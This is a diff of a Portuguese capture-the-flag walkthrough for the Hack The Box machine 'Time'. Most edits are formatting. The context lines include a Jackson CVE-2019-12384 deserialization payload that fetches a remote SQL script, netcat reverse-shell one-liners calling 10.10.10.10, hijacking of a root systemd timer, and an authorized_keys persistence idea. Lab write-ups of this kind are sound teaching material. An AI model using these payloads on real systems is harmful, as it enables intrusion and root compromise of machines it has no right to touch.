@@ -1,26 +1,29 @@
 ---
-date: 2021-04-03 16:00:00+00:00
-images: 
-- https://i.imgur.com/jiSvU4u.png
+title: 'Walktrough: HTB Time'
 language: pt-BR
 localeid: htb-time
+date: 2021-04-03T16:00:00.000Z
 tags:
-- HackTheBox
-- Jackson
-- FasterXML
-- Service Hijack
-- HTB Linux
-- HTB Medium
-- Walktrough
-title: 'Walktrough: HTB Time'
-authors: ['default']
+  - HackTheBox
+  - Jackson
+  - FasterXML
+  - Service Hijack
+  - HTB Linux
+  - HTB Medium
+  - Walktrough
+summary: ''
+images:
+  - 'https://i.imgur.com/jiSvU4u.png'
+authors:
+  - default
 ---
+
 Olá pessoal!
 
 A máquina desta semana será **Time**, outra máquina Linux classificada como mediana do [Hack The Box](https://www.hackthebox.eu), criada por [egotisticalSW](https://app.hackthebox.eu/users/94858) e [felamos](https://app.hackthebox.eu/users/27390).
 
-:information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
-[info]
+\:information\_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
+\[info]
 
 ![HTB Time](https://i.imgur.com/mJmeefG.png)
 
@@ -60,11 +63,11 @@ Após executar algumas enumerações utilizando `whatweb` e `nikto` não encontr
 
 Analisando a aplicação temos duas funcionalidades: **Beautify** e **Validate**:
 
-- A opção **beautify**, ao receber um JSON válido, o formata de forma "bonita" e, ao enviar um request inválido (por exemplo "test"), retorna o valor `null`.
+* A opção **beautify**, ao receber um JSON válido, o formata de forma "bonita" e, ao enviar um request inválido (por exemplo "test"), retorna o valor `null`.
 
 ![Online JSON Parser - Time - beautify](https://i.imgur.com/tpO2p3r.png)
 
-- Já a opção em beta **validate** verifica a sintaxe do JSON fornecido. Quando enviamos um request inválido (por exemplo "test"), exceção não esperada da aplicação é exibida.
+* Já a opção em beta **validate** verifica a sintaxe do JSON fornecido. Quando enviamos um request inválido (por exemplo "test"), exceção não esperada da aplicação é exibida.
 
 ```plaintext
 Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'test': was expecting 'null', 'true', 'false' or NaN
@@ -80,7 +83,7 @@ Pesquisando por CVEs para o jackson-databind, os seguintes foram encontrados par
 
 Dos 4 itens listados, encontrei para o **CVE-2019-12384** um PoC funcional [neste blog](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html), o qual utilizei para obter o acesso inicial. Os seguintes passos foram executados para obter um shell reverso:
 
-- Criação de um arquivo `inject.sql` com o código abaixo, modificado da versão do blog para iniciar um shell reverso para a máquina atacante na porta 4443 e publicado usando um servidor HTTP python3 (`sudo python3 -m http.server 80`) a partir do diretório de onde o arquivo se encontra.
+* Criação de um arquivo `inject.sql` com o código abaixo, modificado da versão do blog para iniciar um shell reverso para a máquina atacante na porta 4443 e publicado usando um servidor HTTP python3 (`sudo python3 -m http.server 80`) a partir do diretório de onde o arquivo se encontra.
 
 ```sql
 CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
@@ -91,8 +94,8 @@ $$;
 CALL SHELLEXEC('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f')
 ```
 
-- Configurando listener via netcat com o comando `nc -lnvp 4443`.
-- Enviado o payload abaixo na aplicação no lugar do JSON a ser validado.
+* Configurando listener via netcat com o comando `nc -lnvp 4443`.
+* Enviado o payload abaixo na aplicação no lugar do JSON a ser validado.
 
 ```plaintext
 ["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.10.10/inject.sql'"}]
@@ -128,7 +131,7 @@ A enumeração foi realizada utilizando o script `linpeas.sh` e um dos itens enc
 
 Este arquivo está configurado para execução através de um **system timer** (`/etc/systemd/system/timer_backup.timer` e `/etc/systemd/system/timer_backup.service`) e configurado para execução **a cada 10s** com privilegios de `root`.
 
-Como temos privilégios para editar o shell script, inclui a linha abaixo para obter um shell reverso e, após alguns segundos, recebi um shell reverso! :smile:
+Como temos privilégios para editar o shell script, inclui a linha abaixo para obter um shell reverso e, após alguns segundos, recebi um shell reverso! \:smile:
 
 ```bash
 rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/g
@@ -150,11 +153,11 @@ uid=0(root) gid=0(root) groups=0(root)
 
 Caso queira uma conexão mais persistente temos duas opções iniciais:
 
-- Configurar o system timer para incluir a chave pública no arquivo `/root/.ssh/authorized_keys`, nos permitindo conectar via SSH como `root`.
-- Iniciar outro shell reverso assim que obtermos a conexão inicial, que pode ser alcançado de múltiplas formas como Metasploit AutoRunScript e colocando uma instrução para ser passada assim que uma conexão via netcat é estabelecida, conforme podemos ver abaixo onde o comando `id` é executado assim que a sessão é iniciada:
+* Configurar o system timer para incluir a chave pública no arquivo `/root/.ssh/authorized_keys`, nos permitindo conectar via SSH como `root`.
+* Iniciar outro shell reverso assim que obtermos a conexão inicial, que pode ser alcançado de múltiplas formas como Metasploit AutoRunScript e colocando uma instrução para ser passada assim que uma conexão via netcat é estabelecida, conforme podemos ver abaixo onde o comando `id` é executado assim que a sessão é iniciada:
 
 ```bash
 printf "id\n" | nc -lnvp 4443
 ```
 
-Espero que tenha sido útil e vejo vocês no próximo post! :smiley:
+Espero que tenha sido útil e vejo vocês no próximo post! \:smiley:
